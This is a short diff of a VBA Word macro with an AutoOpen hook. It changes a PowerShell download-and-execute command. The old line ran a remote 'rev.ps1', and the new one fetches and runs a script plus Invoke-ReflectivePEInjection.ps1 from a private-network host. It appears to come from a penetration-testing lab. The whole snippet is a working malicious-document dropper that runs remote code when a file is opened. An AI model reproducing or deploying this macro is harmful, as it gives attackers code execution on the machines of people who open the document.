@@ -1,6 +1,6 @@
 Sub mymacro()
     Dim Command As String
-    Command = "powershell.exe iex(iwr http://192.168.50.101/rev.ps1 -UseBasicParsing)"
+    Command = "powershell.exe iex(iwr http://192.168.45.159/amit.txt -UseBasicParsing);iex(iwr http://192.168.45.159/Invoke-ReflectivePEInjection.ps1 -UseBasicParsing)"
     Shell Command, 1
 End Sub
 Sub AutoOpen()
